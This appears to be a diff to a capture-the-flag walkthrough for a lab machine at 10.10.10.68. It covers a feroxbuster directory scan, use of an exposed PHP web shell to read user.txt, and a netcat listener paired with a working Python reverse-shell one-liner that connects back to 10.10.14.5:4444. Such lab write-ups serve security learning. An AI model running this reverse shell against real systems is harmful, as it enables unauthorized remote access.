@@ -20,13 +20,17 @@ feroxbuster -u http://10.10.10.68 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w 
 + Check `http://10.10.10.68/dev/`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5fd4e705-edbc-413a-aea1-c21d4bb841fe)
 
+
+## Gaining Access
+
 + Click one of the php files, and gain a semi-interactive web shell.
 + Cat user.txt
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7c07f5a-dc65-41f9-983c-1aa0f5697877)
 
 + Get revershell:
-+ `nc -lnvp 4444`
++ Run on your kali attack vm: `nc -lnvp 4444`
++ Run python reverse shell on the target's browser based semi interactive shell:
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
